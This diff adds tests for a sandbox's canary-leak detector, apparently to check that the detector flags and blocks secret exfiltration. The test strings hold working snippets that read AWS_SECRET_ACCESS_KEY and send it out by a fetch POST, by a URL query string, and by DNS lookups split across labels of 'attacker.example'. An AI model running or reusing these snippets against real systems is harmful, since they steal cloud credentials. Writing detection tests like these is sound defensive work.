@@ -19,6 +19,15 @@ describe("canary", () => {
     expect(findCanaries(host, canaries, { minChunk: 12 }).length).toBe(1);
     expect(findCanaries(host, canaries).length).toBe(0);
   });
+  it("finds a base32-encoded value (case-insensitive DNS exfil)", () => {
+    // RFC 4648 base32 of the canary, no padding.
+    const bytes = Buffer.from(canaries.KEY);
+    const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+    let bits = 0, value = 0, b32 = "";
+    for (const b of bytes) { value = (value << 8) | b; bits += 8; while (bits >= 5) { b32 += A[(value >>> (bits - 5)) & 31]; bits -= 5; } }
+    if (bits > 0) b32 += A[(value << (5 - bits)) & 31];
+    expect(findCanaries(`somehost-${b32}-more`, canaries)[0]?.encoding).toBe("base32");
+  });
 });
 
 describe("fsdiff", () => {
@@ -154,5 +163,43 @@ describe("WasmerRunner Node guest host-fetch path", () => {
     expect(t.stdout).toContain("fetch status 200");
     expect(t.network).toEqual([expect.objectContaining({ host: "example.com", allowed: true })]);
     expect(t.verdict).toBe("clean");
+  }, 120_000);
+
+  it.skipIf(!online)("catches a canary in a Node fetch POST body to an allowed host", async () => {
+    const code = `const s=process.env.AWS_SECRET_ACCESS_KEY; fetch("http://example.com/collect",{method:"POST",body:"key="+s}).then(()=>console.log("posted"),e=>console.log("err",e.message)); setTimeout(()=>{},1500);`;
+    const t = await runner.run(nodeReq(code, preset("research")));
+    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
+    expect(t.verdict).toBe("blocked");
+  }, 120_000);
+});
+
+describe("WasmerRunner payload and label exfil (real sandboxes)", () => {
+  const runner = new WasmerRunner({ maxConcurrent: 2 });
+  afterAll(async () => {
+    await runner.close();
+  });
+  const req = (code: string, policy: RunRequest["policy"]): RunRequest => ({ id: newId("test"), language: "python", code, policy });
+
+  it("reassembles split DNS labels to catch sub-threshold exfil", async () => {
+    // permissive allows the resolves; each label is only 10 chars.
+    const code = "import os, base64, socket\ns = os.environ['AWS_SECRET_ACCESS_KEY'].encode()\nenc = base64.urlsafe_b64encode(s).decode().rstrip('=')\nfor i in range(0, len(enc), 10):\n  try:\n    socket.gethostbyname(enc[i:i+10] + '.x.attacker.example')\n  except Exception:\n    pass\nprint('done')";
+    const t = await runner.run(req(code, preset("permissive")));
+    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
+    expect(t.verdict).toBe("blocked");
+  }, 120_000);
+
+  it("scans a file padded past 1 MB for a canary", async () => {
+    const code = "import os\ns = os.environ['AWS_SECRET_ACCESS_KEY']\nos.makedirs('out', exist_ok=True)\nwith open('out/leak.bin','w') as f:\n  f.write(s + '\\n')\n  f.write('A' * (1024*1024 + 64))\nprint('wrote')";
+    const t = await runner.run(req(code, preset("strict")));
+    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
+    expect(t.violations.map((v) => v.kind)).not.toContain("fs.outside_writable");
+    expect(t.verdict).toBe("blocked");
+  }, 120_000);
+
+  it.skipIf(!online)("catches a canary in a urllib query string to an allowed host", async () => {
+    const code = "import os, urllib.request, urllib.parse\ns = os.environ['AWS_SECRET_ACCESS_KEY']\nurl = 'http://example.com/?' + urllib.parse.urlencode({'k': s})\ntry:\n  urllib.request.urlopen(url, timeout=10).read()\nexcept Exception as e:\n  print('req', e)\nprint('done')";
+    const t = await runner.run(req(code, preset("research")));
+    expect(t.violations.map((v) => v.kind)).toContain("canary.leaked");
+    expect(t.verdict).toBe("blocked");
   }, 120_000);
 });
